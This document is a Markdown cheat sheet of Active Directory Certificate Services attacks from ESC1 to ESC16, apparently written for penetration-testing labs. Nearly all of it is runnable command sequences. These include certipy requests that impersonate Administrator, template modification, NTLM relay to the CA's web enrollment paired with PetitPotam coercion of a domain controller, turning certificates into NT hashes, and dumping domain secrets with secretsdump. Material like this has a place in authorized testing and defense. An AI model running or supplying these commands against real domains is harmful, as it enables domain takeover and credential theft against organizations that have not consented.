# ADCS Certificate Attacks (ESC1-ESC16)

## Enumeration (always start here)
```bash
# Find all vulnerable templates
certipy find -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -vulnerable -stdout
# OR on Kali if the binary is certipy-ad:
certipy-ad find -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -vulnerable -enabled

# NetExec ADCS module
nxc ldap <DC> -u <user> -p '<pass>' -M adcs
```

## ESC1 -- Enrollee Supplies Subject Alternative Name
Template allows client auth + `ENROLLEE_SUPPLIES_SUBJECT`. Any user can
request a cert for any other user (e.g., Administrator).
```bash
# Request cert as Administrator
certipy req -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -target <CA-HOST> \
  -ca '<CA-NAME>' -template '<VULN-TEMPLATE>' -upn 'administrator@<dom>'

# Authenticate with the cert
certipy auth -pfx administrator.pfx -dc-ip <DC>
# Output: NT hash for Administrator
```

## ESC4 -- WriteDACL/GenericAll on Template
Modify a template to become ESC1-vulnerable, exploit it, then restore.
```bash
# Save original config and make it ESC1-vulnerable
certipy template -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> \
  -template '<TEMPLATE>' -save-old

# Now exploit as ESC1 (see above)
certipy req -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -target <CA-HOST> \
  -ca '<CA-NAME>' -template '<TEMPLATE>' -upn 'administrator@<dom>'

# Restore original template config
certipy template -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> \
  -template '<TEMPLATE>' -configuration '<TEMPLATE>.json'
```

## ESC8 -- NTLM Relay to HTTP Enrollment
The CA's web enrollment endpoint accepts NTLM. Coerce a DC to authenticate,
relay to the CA, get a cert as the DC's machine account.
```bash
# Terminal 1: set up relay
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController
# OR: certipy relay -target <CA> -template DomainController

# Terminal 2: coerce DC authentication
python3 petitpotam.py <ATTACKER-IP> <DC-IP>
# OR with creds:
python3 petitpotam.py -d <dom> -u <user> -p '<pass>' <ATTACKER-IP> <DC-IP>

# After relay captures cert:
certipy auth -pfx <captured>.pfx -dc-ip <DC>
```

## ESC13 -- Issuance Policy Linked to Privileged Group
An issuance policy OID is linked (via `msDS-OIDToGroupLink`) to a privileged
group. Enrolling in a template with that policy grants group membership in the
issued cert.
```bash
certipy find -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -vulnerable -stdout
# Look for ESC13 in output, then standard enrollment
certipy req -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -target <CA-HOST> \
  -ca '<CA-NAME>' -template '<ESC13-TEMPLATE>'
certipy auth -pfx <cert>.pfx -dc-ip <DC>
```

## ESC15 / EKUwu (CVE-2024-49019)
Schema V1 template allows the enrollee to specify an application policy
(EKU) in the CSR. Inject Client Authentication EKU into a template that
normally wouldn't allow it. Patched Dec 2024 but exploitable on unpatched DCs.
```bash
certipy req -u '<user>@<dom>' -p '<pass>' -dc-ip <DC> -target <CA-HOST> \
  -ca '<CA-NAME>' -template '<V1-TEMPLATE>' \
  -application-policies '1.3.6.1.5.5.7.3.2'  # Client Authentication OID
certipy auth -pfx <cert>.pfx -dc-ip <DC>
```

## Authentication with certificates
```bash
# Get NT hash from PFX
certipy auth -pfx cert.pfx -dc-ip <DC>
# Output: <user> hash: <NTLM>

# Use the hash
nxc smb <DC> -u <user> -H <NTLM>
impacket-secretsdump '<dom>/<user>@<DC>' -hashes :<NTLM>

# PKINIT (get TGT from cert)
certipy auth -pfx cert.pfx -dc-ip <DC> -username <user> -domain <dom>
```

## Other ESC variants (less common on HTB)
- **ESC2**: Template allows `Any Purpose` or `SubCA` EKU.
- **ESC3**: Certificate Request Agent template (enroll on behalf of others).
- **ESC6**: CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (SAN in any request).
- **ESC7**: Manage CA / Manage Certificates rights on CA itself.
- **ESC9/ESC10**: `CT_FLAG_NO_SECURITY_EXTENSION` / weak cert mapping.
- **ESC11**: NTLM relay to ICertPassage (RPC enrollment, no HTTP needed).

All detectable with `certipy find -vulnerable`.
